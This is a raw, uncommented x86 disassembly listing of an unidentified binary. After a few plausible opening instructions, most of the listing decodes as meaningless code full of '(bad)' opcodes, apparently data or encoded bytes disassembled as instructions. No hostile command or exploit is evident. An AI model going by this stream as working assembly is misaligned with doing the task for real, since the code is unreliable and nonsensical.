  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	(bad)  
  41c93c:	cmp    DWORD PTR [ebx+0x166befbc],edx
  41c942:	sbb    BYTE PTR [edx+edx*1+0x61081818],bh
  41c949:	add    bl,bh
  41c94b:	pop    ebp
  41c94c:	add    eax,DWORD PTR [eax]
  41c94e:	(bad)  
  41c94f:	addr16 dec edi
  41c951:	mov    gs,WORD PTR [esi-0x226b5bf0]
  41c957:	in     al,0x5e
  41c959:	je     0x41c957
  41c95b:	into   
  41c95c:	mov    al,gs:0x6a04d5a1
  41c962:	lock mov bh,0xfe
  41c965:	inc    esp
  41c966:	das    
  41c967:	out    dx,al
  41c968:	mov    ebp,0x91cd822f
  41c96d:	enter  0x4ce2,0xe3
  41c971:	mov    dl,0xeb
  41c973:	inc    ebp
  41c974:	sbb    BYTE PTR [edx+ebp*1+0x3fb8fd64],0x67
  41c97c:	jae    0x41c9a7
  41c97e:	mov    edi,0x70a120b3
  41c983:	out    0xa5,eax
  41c985:	daa    
  41c986:	push   0xffffff88
  41c988:	adc    al,0xb9
  41c98a:	jne    0x41c997
  41c98c:	jle    0x41c97b
  41c98e:	ja     0x41c9b7
  41c990:	cmp    al,0xca
  41c992:	das    
  41c993:	pushf  
  41c994:	mov    dl,0x58
  41c996:	sub    eax,0x19988525
  41c99b:	adc    BYTE PTR [esp+ebx*2],ah
  41c99e:	aad    0x25
  41c9a0:	stos   DWORD PTR es:[edi],eax
  41c9a1:	cmc    
  41c9a2:	push   0x5be4c3d3
  41c9a7:	inc    ebp
  41c9a8:	scas   eax,DWORD PTR es:[edi]
  41c9a9:	fdiv   QWORD PTR [edx]
  41c9ab:	rol    BYTE PTR [ecx-0x2],0xd7
  41c9af:	cmp    ch,BYTE PTR [eax-0x3c]
  41c9b2:	out    dx,al
  41c9b3:	lock fiadd DWORD PTR [ecx-0x3c]
  41c9b7:	xor    DWORD PTR [esi+0x5],edi
  41c9ba:	retf   0x51a5
  41c9bd:	mov    edi,0x9a8a9319
  41c9c2:	stos   DWORD PTR es:[edi],eax
  41c9c3:	cli    
  41c9c4:	lahf   
  41c9c5:	popf   
  41c9c6:	jge    0x41ca10
  41c9c8:	and    eax,edx
  41c9ca:	inc    esp
  41c9cb:	js     0x41ca37
  41c9cd:	inc    DWORD PTR [edi+0x40]
  41c9d0:	sbb    DWORD PTR [edx+0x30],edx
  41c9d3:	jle    0x41c9a7
  41c9d5:	cmp    eax,0x958f93c6
  41c9da:	mov    bl,0xab
  41c9dc:	lods   al,BYTE PTR ds:[esi]
  41c9dd:	pop    ebx
  41c9de:	rcr    DWORD PTR [ecx+edi*2],1
  41c9e1:	inc    bh
  41c9e3:	mov    ah,0x62
  41c9e5:	jle    0x41ca1f
  41c9e7:	xchg   esp,eax
  41c9e8:	push   0x864eae94
  41c9ed:	ja     0x41ca07
  41c9ef:	rcr    DWORD PTR [ecx],0xb5
  41c9f2:	mov    BYTE PTR [edi],cl
  41c9f4:	sbb    DWORD PTR [ecx+0x765303a1],0xba0d17d0
  41c9fe:	ror    eax,1
  41ca00:	imul   edx,eax,0xffffff80
  41ca03:	mov    edi,ebx
  41ca05:	lahf   
  41ca06:	je     0x41c9bc
  41ca08:	mov    eax,ds:0x6c2925b1
  41ca0d:	add    DWORD PTR [ebx+0x4f31741e],eax
  41ca13:	cmp    DWORD PTR [ebp+esi*8-0x77782d0],0x3a8116f0
  41ca1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca1f:	sub    cl,BYTE PTR [ebp+0x460af42d]
  41ca25:	(bad)  
  41ca26:	fstp   DWORD PTR [ecx]
  41ca28:	and    al,BYTE PTR [esi]
  41ca2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca2b:	mov    ds:0xb3ab9e0f,eax
  41ca30:	mov    bh,0x1
  41ca32:	rol    DWORD PTR [edx+0x1b8623da],cl
  41ca38:	pop    ebx
  41ca39:	jns    0x41ca0b
  41ca3b:	lods   eax,DWORD PTR ds:[esi]
  41ca3c:	inc    esi
  41ca3d:	cld    
  41ca3e:	add    DWORD PTR [ebx-0x6d],edi
  41ca41:	sti    
  41ca42:	mov    BYTE PTR [eax],al
  41ca44:	pop    ebp
  41ca45:	mov    WORD PTR [eax],cs
  41ca47:	mov    DWORD PTR [eax-0x25f79b9e],0xce16e29
  41ca51:	aam    0x89
  41ca53:	mov    ds:0x7d68b093,al
  41ca58:	cmp    ebx,DWORD PTR [eax]
  41ca5a:	ja     0x41ca05
  41ca5c:	inc    ebx
  41ca5d:	bound  esp,QWORD PTR [esi]
  41ca5f:	les    ecx,FWORD PTR [esi+0x611fde15]
  41ca65:	xor    esp,eax
  41ca67:	xor    BYTE PTR ds:0xe70eaa1d,dl
  41ca6d:	dec    esp
  41ca6e:	lods   eax,DWORD PTR ds:[si]
  41ca70:	adc    eax,0x38bd5dd0
  41ca75:	mov    ?,eax
  41ca77:	dec    ebp
  41ca78:	inc    edi
  41ca79:	aaa    
  41ca7a:	ins    DWORD PTR es:[edi],dx
  41ca7b:	pusha  
  41ca7c:	in     al,0x6d
  41ca7e:	in     al,0xfa
  41ca80:	scas   al,BYTE PTR es:[edi]
  41ca81:	ja     0x41ca6d
  41ca83:	jmp    0x3f47f97a
  41ca88:	mov    al,0x37
  41ca8a:	add    bh,BYTE PTR [esp+edx*2-0x7b5c7d78]
  41ca91:	dec    ebx
  41ca92:	int3   
  41ca93:	push   esp
  41ca94:	imul   ebx,DWORD PTR [eax],0xd
  41ca97:	jl     0x41ca6a
  41ca99:	pop    ebp
  41ca9a:	jbe    0x41cae6
  41ca9c:	nop
  41ca9d:	xlat   BYTE PTR gs:[ebx]
  41ca9f:	pop    ds
  41caa0:	cdq    
  41caa1:	lea    ecx,[edx-0x43331e74]
  41caa7:	push   edi
  41caa8:	jle    0x41cadf
  41caaa:	stos   DWORD PTR es:[edi],eax
  41caab:	jle    0x159fa7bf
  41cab1:	in     eax,0xf9
  41cab3:	xor    ebx,DWORD PTR [ebp-0x53]
  41cab6:	and    DWORD PTR [eax-0x7],ebx
  41cab9:	xor    DWORD PTR ds:0xeb4e27a7,esp
  41cabf:	popf   
  41cac0:	or     dl,BYTE PTR [eax]
  41cac2:	outs   dx,DWORD PTR ds:[esi]
  41cac3:	aaa    
  41cac4:	jecxz  0x41cacd
  41cac6:	add    al,0x72
  41cac8:	pop    ss
  41cac9:	jecxz  0x41ca9a
  41cacb:	xlat   BYTE PTR ds:[ebx]
  41cacc:	sub    DWORD PTR [ebp+0x1d14f56],esp
  41cad2:	sub    DWORD PTR ds:0xd7ad18e0,ecx
  41cad8:	scas   al,BYTE PTR es:[edi]
  41cad9:	(bad)  
  41cada:	arpl   WORD PTR [ebx-0x1],di
  41cadd:	lahf   
  41cade:	xchg   BYTE PTR [edx+0x712b5498],ah
  41cae4:	sbb    dh,BYTE PTR [edx+edx*1-0xacb659]
  41caeb:	and    DWORD PTR [ebx],esp
  41caed:	cmp    DWORD PTR [ecx+ebp*4],ebp
  41caf0:	inc    esi
  41caf1:	pusha  
  41caf2:	push   ebp
  41caf3:	cmp    edi,DWORD PTR [esi]
  41caf5:	enter  0x3e31,0xe5
  41caf9:	xor    ch,0xfe
  41cafc:	pop    ebp
  41cafd:	fcom   QWORD PTR [eax]
  41caff:	sbb    eax,0xed01ab6e
  41cb04:	adc    al,0x35
  41cb06:	add    ebx,DWORD PTR [esi-0x6cbef98d]
  41cb0c:	jmp    0x41cb3e
  41cb0e:	ret    0xf641
  41cb11:	push   ecx
  41cb12:	cli    
  41cb13:	and    ebx,0xd13753f3
  41cb19:	push   edx
  41cb1a:	popf   
  41cb1b:	sub    BYTE PTR [edx-0x71],dl
  41cb1e:	xchg   BYTE PTR [edx],ah
  41cb20:	cmp    ebx,ecx
  41cb22:	repz loope 0x41cb9a
  41cb25:	nop
  41cb26:	dec    edi
  41cb27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb28:	out    dx,eax
  41cb29:	aad    0x4e
  41cb2b:	push   0xffffffb3
  41cb2d:	fsubrp st(0),st
  41cb2f:	push   ecx
  41cb30:	repnz xor al,0x53
  41cb33:	(bad)  
  41cb34:	cmp    eax,0x4fa9666a
  41cb39:	add    ebx,DWORD PTR [ebx]
  41cb3b:	and    al,0xcb
  41cb3d:	xchg   edi,eax
  41cb3e:	repz adc al,0xc5
  41cb41:	adc    edi,DWORD PTR [esi+0x45526812]
  41cb47:	dec    edx
  41cb48:	je     0x41cb20
  41cb4a:	inc    ebx
  41cb4b:	mov    esi,0x475dd857
  41cb50:	sub    eax,0xd4479a7c
  41cb55:	out    dx,al
  41cb56:	cs pusha 
  41cb58:	inc    ebx
  41cb59:	xchg   esp,eax
  41cb5a:	and    bl,BYTE PTR [esi+ebx*4+0x48]
  41cb5e:	ficom  DWORD PTR [ebx+0xa]
  41cb61:	sub    DWORD PTR [esi+0x53be1ce4],ebp
  41cb67:	mov    cl,0x19
  41cb69:	fcomp  DWORD PTR [eax-0x236f8d2f]
  41cb6f:	sub    bl,dl
  41cb71:	imul   esi
  41cb73:	icebp  
  41cb74:	jmp    0xebc5:0xc6e2604e
  41cb7b:	cld    
  41cb7c:	fst    QWORD PTR [esi]
  41cb7e:	push   esp
  41cb7f:	je     0x41cb0c
  41cb81:	loopne 0x41cbe2
  41cb83:	inc    ebp
  41cb84:	add    ah,BYTE PTR [esi+0xd6f1329]
  41cb8a:	xchg   edx,eax
  41cb8b:	cmp    BYTE PTR [ebx],cl
  41cb8d:	(bad)  
  41cb8e:	mov    ch,0x3
  41cb90:	push   es
  41cb91:	out    dx,eax
  41cb92:	mov    ebp,0x52b28c29
  41cb97:	mov    cl,0xa2
  41cb99:	sar    ch,0x68
  41cb9c:	sub    esi,0x4a
  41cb9f:	lods   eax,DWORD PTR ds:[esi]
  41cba0:	push   ebx
  41cba1:	sti    
  41cba2:	lods   eax,DWORD PTR ds:[esi]
  41cba3:	mov    bh,0xb2
  41cba5:	mov    BYTE PTR [ebp+0x55],bh
  41cba8:	aam    0xb2
  41cbaa:	fisubr WORD PTR [ebx+esi*8]
  41cbad:	add    BYTE PTR [edi+0x42c7fc99],0xe6
  41cbb4:	in     al,0xf2
  41cbb6:	mov    ah,0xbe
  41cbb8:	add    eax,DWORD PTR [eax]
  41cbba:	(bad)  
  41cbbc:	int    0xe0
  41cbbe:	gs in  al,dx
  41cbc0:	inc    edi
  41cbc1:	jle    0x41cbe5
  41cbc3:	mov    eax,ds:0x87e4a230
  41cbc8:	mov    eax,0x939e2508
  41cbcd:	mov    BYTE PTR [ecx+0xb],cl
  41cbd0:	das    
  41cbd1:	shl    DWORD PTR [ebp-0x42],0x10
  41cbd5:	xchg   ebp,eax
  41cbd6:	sub    eax,0x32e6ff2c
  41cbdb:	xor    cl,0x1a
  41cbde:	(bad)  
  41cbdf:	shl    BYTE PTR [ecx],0x97
  41cbe2:	jbe    0x41cbe6
  41cbe4:	outs   dx,DWORD PTR ds:[esi]
  41cbe5:	inc    ebp
  41cbe6:	adc    al,0xe7
  41cbe8:	push   edi
  41cbe9:	sbb    bl,bh
  41cbeb:	add    DWORD PTR [ebp+0x5a],edx
  41cbee:	cs xchg esi,eax
  41cbf0:	mov    esi,ecx
  41cbf2:	mov    ds:0xd60db9b0,al
  41cbf7:	and    bh,dl
  41cbf9:	mov    edx,0xc11d3193
  41cbfe:	fadd   QWORD PTR [eax]
  41cc00:	jecxz  0x41cbf7
  41cc02:	push   esi
  41cc03:	dec    edx
  41cc04:	jl     0x41cc7b
  41cc06:	out    dx,eax
  41cc07:	popa   
  41cc08:	stos   DWORD PTR es:[edi],eax
  41cc09:	(bad)  
  41cc0a:	sub    BYTE PTR [ebp-0x24],dh
  41cc0d:	mov    edx,0x7012bbf4
  41cc12:	scas   eax,DWORD PTR es:[edi]
  41cc13:	fs adc ah,ah
  41cc16:	imul   ebp,DWORD PTR [eax+esi*1],0xb657dc47
  41cc1d:	clc    
  41cc1e:	ins    BYTE PTR es:[edi],dx
  41cc1f:	sub    ebx,0x5d
  41cc22:	out    0x62,eax
  41cc24:	fbstp  TBYTE PTR [eax-0x65]
  41cc27:	pushf  
  41cc28:	xor    dh,BYTE PTR [eax]
  41cc2a:	push   eax
  41cc2b:	and    ah,0x6c
  41cc2e:	aam    0x75
  41cc30:	add    eax,0x1460e3e4
  41cc35:	mov    ds:0x9361897,eax
  41cc3a:	mov    edi,0xff6e152
  41cc3f:	ins    DWORD PTR es:[edi],dx
  41cc40:	outs   dx,DWORD PTR ds:[esi]
  41cc41:	push   esi
  41cc42:	cmp    BYTE PTR [eax+eax*2-0x7a85e767],ch
  41cc49:	fisttp DWORD PTR ds:0x285df186
  41cc4f:	inc    esp
  41cc50:	repnz stos BYTE PTR es:[edi],al
  41cc52:	pop    es
  41cc53:	fcom   DWORD PTR [edx-0x5b505561]
  41cc59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc5a:	add    al,0xfe
  41cc5c:	sti    
  41cc5d:	icebp  
  41cc5e:	cwde   
  41cc5f:	jo     0x41cc28
  41cc61:	cmp    eax,0x47b80b4c
  41cc66:	xor    al,BYTE PTR [ecx]
  41cc68:	fdiv   DWORD PTR [edi]
  41cc6a:	arpl   WORD PTR [edx+0x5d0c7aa4],si
  41cc70:	lods   al,BYTE PTR ds:[esi]
  41cc71:	and    eax,0x2d8c62ce
  41cc76:	fsubr  DWORD PTR [ebp+0x1ce439cd]
  41cc7c:	pop    edx
  41cc7d:	mov    ds:0x21326cc5,eax
  41cc82:	loope  0x41ccbf
  41cc84:	jmp    0xbad5eca8
  41cc89:	imul   eax,DWORD PTR [ebx-0x61d0bddf],0x31
  41cc90:	int3   
  41cc91:	cwde   
  41cc92:	sub    al,0xfb
  41cc94:	and    DWORD PTR [ecx-0x66c2ea92],ecx
  41cc9a:	dec    esp
  41cc9b:	pop    ecx
  41cc9c:	in     eax,dx
  41cc9d:	push   DWORD PTR [esi-0x50]
  41cca0:	jbe    0x41cc6c
  41cca2:	(bad)  
  41cca3:	mov    bl,0x70
  41cca5:	xor    edx,DWORD PTR [eax-0x1dd54108]
  41ccab:	sub    bh,BYTE PTR [ecx+0x60]
  41ccae:	mov    es,WORD PTR [eax+edi*8-0x46e8ed95]
  41ccb5:	(bad)  
  41ccb6:	pop    edx
  41ccb7:	retf   
  41ccb8:	mov    ss,WORD PTR [ebx+0x2f]
  41ccbb:	out    0x32,eax
  41ccbd:	mov    BYTE PTR [ecx],bh
  41ccbf:	and    al,0xe4
  41ccc1:	sbb    al,0x17
  41ccc3:	(bad)  
  41ccc4:	mov    ch,0xf4
  41ccc6:	xor    BYTE PTR [edx-0x3c],cl
  41ccc9:	mov    BYTE PTR [edx-0x29f42add],bh
  41cccf:	add    BYTE PTR [edx],bh
  41ccd1:	jo     0x41cd24
  41ccd3:	dec    esi
  41ccd4:	pop    ss
  41ccd5:	cdq    
  41ccd6:	(bad)  
  41ccd7:	int3   
  41ccd8:	sbb    BYTE PTR [ebx+edi*1],bl
  41ccdb:	xchg   esp,eax
  41ccdc:	les    ecx,FWORD PTR [edi+0x1cdfdc8e]
  41cce2:	fsubr  DWORD PTR [edi]
  41cce4:	xor    DWORD PTR [edi*4+0x5e2f6cf1],ecx
  41cceb:	fs add al,0xd4
  41ccee:	mov    al,ds:0xdf16d6fb
  41ccf3:	xor    al,0x75
  41ccf5:	popa   
  41ccf6:	push   ds
  41ccf7:	push   eax
  41ccf8:	mov    al,ds:0x3c244c8a
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xbca5e6df
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x24681818],bh
  41cd1e:	inc    eax
  41cd1f:	loope  0x41cd78
  41cd21:	jge    0x41ccfc
  41cd23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd24:	mov    ch,0xfe
  41cd26:	dec    esp
  41cd27:	retf   
  41cd28:	adc    eax,DWORD PTR ds:0x63b2e660
  41cd2e:	stos   DWORD PTR es:[edi],eax
  41cd2f:	add    ecx,DWORD PTR [eax+ebp*8-0x19f746c]
  41cd36:	pop    ss
  41cd37:	fsubr  QWORD PTR [ecx]
  41cd39:	xchg   eax,ecx
  41cd3b:	cmp    dl,BYTE PTR [ecx-0x1e]
  41cd3e:	lock add DWORD PTR [edi+0x6f831dc7],ecx
  41cd45:	push   esp
  41cd46:	fs inc ecx
  41cd48:	enter  0x1622,0xe6
  41cd4c:	cwde   
  41cd4d:	outs   dx,BYTE PTR ds:[esi]
  41cd4e:	(bad)  
  41cd4f:	mov    edx,0xd43ac517
  41cd54:	adc    BYTE PTR [eax+eiz*1],dl
  41cd57:	mov    ss,edx
  41cd59:	or     dh,0xdd
  41cd5c:	nop
  41cd5d:	jge    0x41cd91
  41cd5f:	imul   BYTE PTR [ebx+0x1]
  41cd62:	(bad)
  41cd66:	sub    esi,DWORD PTR [ecx]
  41cd68:	jae    0x41cd4f
  41cd6a:	lea    edi,[ebp+0x19cd0103]
  41cd70:	mov    edi,0x6b10f352
  41cd75:	js     0x41cdea
  41cd77:	jmp    0xece9:0xc4e665d7
  41cd7e:	int    0xe7
  41cd80:	ret    0x4d74
  41cd83:	jle    0x41cd6c
  41cd85:	ret    0x5afe
  41cd88:	xor    BYTE PTR [esi-0x7f966b04],dh
  41cd8e:	(bad)  
  41cd90:	xlat   BYTE PTR ds:[ebx]
  41cd91:	push   eax
  41cd92:	jbe    0x41cdc6
  41cd94:	inc    ebp
  41cd95:	xor    eax,0x99ad90ac
  41cd9a:	test   BYTE PTR ds:0xa4021d86,0x6f
  41cda1:	loop   0x41ce0b
  41cda3:	push   es
  41cda4:	mov    ebx,0x297873b3
  41cda9:	shl    BYTE PTR [edx+0x7e],1
  41cdac:	retf   0xd325
  41cdaf:	add    DWORD PTR [ebx+0x1591e16f],ecx
  41cdb5:	add    BYTE PTR [ebx-0x23],dh
  41cdb8:	cmp    al,0xc4
  41cdba:	fsubp  st(3),st
  41cdbc:	xor    al,0xa8
  41cdbe:	adc    edx,ebx
  41cdc0:	retf   0x1787
  41cdc3:	jmp    FWORD PTR fs:[edx+0x37085929]
  41cdca:	outs   dx,DWORD PTR ds:[esi]
  41cdcb:	sub    eax,0x590dafab
  41cdd0:	pop    esp
  41cdd1:	enter  0x7ba3,0xcb
  41cdd5:	mov    al,0x55
  41cdd7:	das    
  41cdd8:	inc    ebx
  41cdd9:	pop    ds
  41cdda:	sar    DWORD PTR [edx+0x57],1
  41cddd:	mov    es,esp
  41cddf:	xchg   esi,eax
  41cde0:	popf   
  41cde1:	adc    BYTE PTR [esi-0x4],0x90
  41cde5:	outs   dx,BYTE PTR ds:[esi]
  41cde6:	sub    DWORD PTR [edx-0x46b7a5d5],esp
  41cdec:	js     0x41cd9c
  41cdee:	inc    edi
  41cdef:	out    0xb9,eax
  41cdf1:	xchg   edi,eax
  41cdf2:	imul   BYTE PTR [eax-0x2f4da48d]
  41cdf8:	jae    0x41cda5
  41cdfa:	stos   DWORD PTR es:[edi],eax
  41cdfb:	xchg   ecx,eax
  41cdfc:	jno    0x41ce3a
  41cdfe:	push   ebp
  41cdff:	(bad)  
  41ce00:	idiv   DWORD PTR [esi]
  41ce02:	rcl    BYTE PTR [eax-0x1eba260e],1
  41ce08:	push   0xe
  41ce0a:	jo     0x41ce32
  41ce0c:	shl    bl,0x18
  41ce0f:	shl    DWORD PTR [edx+esi*8-0x37],cl
  41ce13:	jp     0x41cddf
  41ce15:	arpl   WORD PTR [esi],sp
  41ce17:	add    eax,0xc590c2d6
  41ce1c:	cdq    
  41ce1d:	and    ah,0x30
  41ce20:	mov    al,0xbd
  41ce22:	jb     0x41ce83
  41ce24:	cmp    BYTE PTR [edi],dh
  41ce26:	scas   eax,DWORD PTR es:[edi]
  41ce27:	fwait
  41ce28:	inc    edx
  41ce29:	xlat   BYTE PTR ds:[ebx]
  41ce2a:	(bad)  
  41ce2b:	mov    ebx,0x10b5b142
  41ce30:	mov    ?,WORD PTR [edx]
  41ce32:	jp     0x41ce96
  41ce34:	cdq    
  41ce35:	fcomp  QWORD PTR [eax-0x3]
  41ce38:	shr    BYTE PTR [ebx+ebx*1-0x2750b1ba],1
  41ce3f:	push   ebx
  41ce40:	imul   ebx,DWORD PTR [edx+ebx*2+0x57229acc],0xd1d02bdc
  41ce4b:	cmp    esi,esi
  41ce4d:	cmp    BYTE PTR [eax+0x2a],cl
  41ce50:	push   esp
  41ce51:	aam    0xd6
  41ce53:	ret    0x9619
  41ce56:	inc    ebp
  41ce57:	and    edi,DWORD PTR [ebx+0x9]
  41ce5a:	sub    eax,0x99c1756e
  41ce5f:	ins    BYTE PTR es:[edi],dx
  41ce60:	push   edi
  41ce61:	ins    DWORD PTR es:[edi],dx
  41ce62:	mov    ebx,0x4650b09
  41ce67:	mov    edx,0x12f69f3e
  41ce6c:	push   es
  41ce6d:	push   ss
  41ce6e:	test   DWORD PTR [ebp-0x45f955b5],edx
  41ce74:	jns    0x41ce13
  41ce76:	and    DWORD PTR [ecx+0x74],esp
  41ce79:	fisubr WORD PTR [ebx+0x7a]
  41ce7c:	mov    ebx,ecx
  41ce7e:	sub    DWORD PTR [edi],esp
  41ce80:	mov    ah,0x4c
  41ce82:	iret   
  41ce83:	dec    esi
  41ce84:	add    BYTE PTR [edi*8+0x4a938507],dl
  41ce8b:	das    
  41ce8c:	push   edi
  41ce8d:	dec    edx
  41ce8e:	inc    ecx
  41ce8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce90:	or     eax,0x51326584
  41ce95:	bound  ebx,QWORD PTR [ebp-0x778a27aa]
  41ce9b:	ret    
  41ce9c:	inc    edi
  41ce9d:	addr16 push 0x16
  41cea0:	jo     0x41ce72
  41cea2:	(bad)  
  41cea3:	aad    0x8b
  41cea5:	jne    0x41ce8b
  41cea7:	in     al,0x9b
  41cea9:	dec    edx
  41ceaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceab:	ins    BYTE PTR es:[edi],dx
  41ceac:	jle    0x41cf0b
  41ceae:	ret    
  41ceaf:	mul    BYTE PTR [ebp+0x3068a803]
  41ceb5:	jl     0x41cf27
  41ceb7:	bound  edx,QWORD PTR [ebp+0x7a827b20]
  41cebd:	hlt    
  41cebe:	pop    ds
  41cebf:	or     DWORD PTR [ebp+0x71419ceb],ebx
  41cec5:	imul   esi,DWORD PTR [ecx-0x5c1852cd],0x290a0bc2
  41cecf:	out    0x7d,al
  41ced1:	out    0x91,al
  41ced3:	and    ch,dl
  41ced5:	cdq    
  41ced6:	jno    0x41cf28
  41ced8:	adc    eax,0xffffff8a
  41cedb:	fstp   TBYTE PTR ds:0x47c95746
  41cee1:	(bad)
  41cee4:	mov    WORD PTR [eax-0x65fb7e61],cs
  41ceea:	dec    ebx
  41ceeb:	jmp    0xe55af145
  41cef0:	rol    ah,0x5b
  41cef3:	pop    ebx
  41cef4:	push   ds
  41cef5:	repz mov ecx,0x52830956
  41cefb:	imul   BYTE PTR [ecx+0x6ea4becb]
  41cf01:	inc    ecx
  41cf02:	fcomp  QWORD PTR [edi+0x19]
  41cf05:	sbb    eax,0xe16f814
  41cf0a:	push   esi
  41cf0b:	dec    esp
  41cf0c:	test   bl,dh
  41cf0e:	push   esi
  41cf0f:	xchg   edi,eax
  41cf10:	ins    BYTE PTR es:[edi],dx
  41cf11:	call   0xcc6c:0xdee39974
  41cf18:	pop    edi
  41cf19:	mov    esi,0xe3b1e68d
  41cf1e:	jmp    DWORD PTR [edi]
  41cf20:	call   0x512a9711
  41cf25:	outs   dx,DWORD PTR fs:[esi]
  41cf27:	test   eax,0x766cb490
  41cf2c:	jns    0x41cf0e
  41cf2e:	mov    eax,ds:0x11e1afad
  41cf33:	lock pop esp
  41cf35:	sar    DWORD PTR [edi-0x80],1
  41cf38:	in     eax,dx
  41cf39:	cmp    esp,edx
  41cf3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3c:	or     esp,ebp
  41cf3e:	fidivr DWORD PTR ds:0xf23a422a
  41cf44:	jo     0x41cf40
  41cf46:	and    ecx,edi
  41cf48:	es pop esi
  41cf4a:	popa   
  41cf4b:	loopne 0x41cf9d
  41cf4d:	ret    0x5cd1
  41cf50:	push   0x7f
  41cf52:	push   cs
  41cf53:	addr16 xor al,0xe4
  41cf56:	ja     0x41cfcd
  41cf58:	mov    WORD PTR [edx],cs
  41cf5a:	adc    ecx,DWORD PTR [edi-0x2dbb8b9c]
  41cf60:	fidiv  WORD PTR [ebx]
  41cf62:	inc    ecx
  41cf63:	fidivr DWORD PTR es:[edx+0x79]
  41cf67:	xor    eax,0xac2d9f1
  41cf6c:	(bad)  
  41cf6d:	repz sahf 
  41cf6f:	xchg   esp,eax
  41cf70:	xor    eax,0x5757df6d
  41cf75:	cli    
  41cf76:	push   cs
  41cf77:	jbe    0x41cfab
  41cf79:	retf   
  41cf7a:	pop    edx
  41cf7b:	in     al,dx
  41cf7c:	jge    0x41cf5f
  41cf7e:	mov    bl,0x20
  41cf80:	rcr    DWORD PTR [esi-0xa02b5c0],0x9c
  41cf87:	es and bh,dl
  41cf8a:	ret    0x5308
  41cf8d:	xchg   ecx,eax
  41cf8e:	cwde   
  41cf8f:	inc    esi
  41cf90:	inc    edx
  41cf91:	hlt    
  41cf92:	pushf  
  41cf93:	add    bl,cl
  41cf95:	xor    al,0x45
  41cf97:	scas   eax,DWORD PTR es:[edi]
  41cf98:	sbb    al,cl
  41cf9a:	in     al,dx
  41cf9b:	jo     0x41cfc1
  41cf9d:	mov    dl,0x84
  41cf9f:	push   esi
  41cfa0:	push   DWORD PTR ds:0xf1670093
  41cfa6:	stc    
  41cfa7:	sbb    al,0x2d
  41cfa9:	or     BYTE PTR [ebp-0x2b],dh
  41cfac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfad:	sbb    cl,BYTE PTR [edi]
  41cfaf:	mov    dh,cl
  41cfb1:	and    bl,0x3a
  41cfb4:	es pop ss
  41cfb6:	es (bad) 
  41cfb8:	out    0x9f,eax
  41cfba:	hlt    
  41cfbb:	mov    DWORD PTR [eax-0x54fba7b5],eax
  41cfc1:	or     al,0xe
  41cfc3:	dec    edi
  41cfc4:	add    DWORD PTR [ebx+0x38],edi
  41cfc7:	or     eax,DWORD PTR [eax-0x69]
  41cfca:	pop    ss
  41cfcb:	cmp    BYTE PTR [esi+0x7],bh
  41cfce:	jl     0x41d00d
  41cfd0:	sbb    ebp,ecx
  41cfd2:	int3   
  41cfd3:	inc    eax
  41cfd4:	push   ebp
  41cfd5:	pop    ds
  41cfd6:	sbb    eax,0x67d3767e
  41cfdb:	data16 mov al,ds:0x8b811237
  41cfe1:	jge    0x41cfaf
  41cfe3:	pop    es
  41cfe4:	xor    ebx,esi
  41cfe6:	lahf   
  41cfe7:	mov    ds:0x97ddc5a0,eax
  41cfec:	mov    bh,0x76
  41cfee:	test   al,0xf1
  41cff0:	test   BYTE PTR [esi-0x56],al
  41cff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cff4:	sbb    al,0x54
  41cff6:	push   ss
  41cff7:	sub    BYTE PTR [ebp-0x2e],bh
  41cffa:	push   eax
  41cffb:	arpl   WORD PTR [edx+eax*2],cx
  41cffe:	pushf  
  41cfff:	adc    esi,ecx
  41d001:	sub    BYTE PTR ds:[edx+0x4b],bh
  41d005:	sub    ch,BYTE PTR [bp+di]
  41d008:	int3   
  41d009:	(bad)  
  41d00a:	mov    dh,0xb3
  41d00c:	pusha  
  41d00d:	inc    esp
  41d00e:	or     al,0xd9
  41d010:	inc    eax
  41d011:	ret    
  41d012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d013:	mov    ds:0xcf765491,al
  41d018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d019:	dec    ebp
  41d01a:	lahf   
  41d01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d01c:	mov    edi,0x232dd2df
  41d021:	add    cl,dh
  41d023:	gs or  esp,esi
  41d026:	mov    al,0x52
  41d028:	out    0xbd,eax
  41d02a:	push   ebx
  41d02b:	cmp    al,0xda
  41d02d:	or     eax,0x90fa9622
  41d032:	je     0x41d024
  41d034:	or     eax,0x5ad4f847
  41d039:	imul   ecx,ebp,0xfffffffc
  41d03c:	(bad)  [esi-0x3e]
  41d03f:	jbe    0x41d0be
  41d041:	xchg   edi,eax
  41d042:	ret    0x816f
  41d045:	aaa    
  41d046:	xchg   esp,eax
  41d047:	add    al,BYTE PTR [ebp+ecx*8+0x23]
  41d04b:	fistp  DWORD PTR [ebx]
  41d04d:	mov    ah,0x5
  41d04f:	add    al,0x5
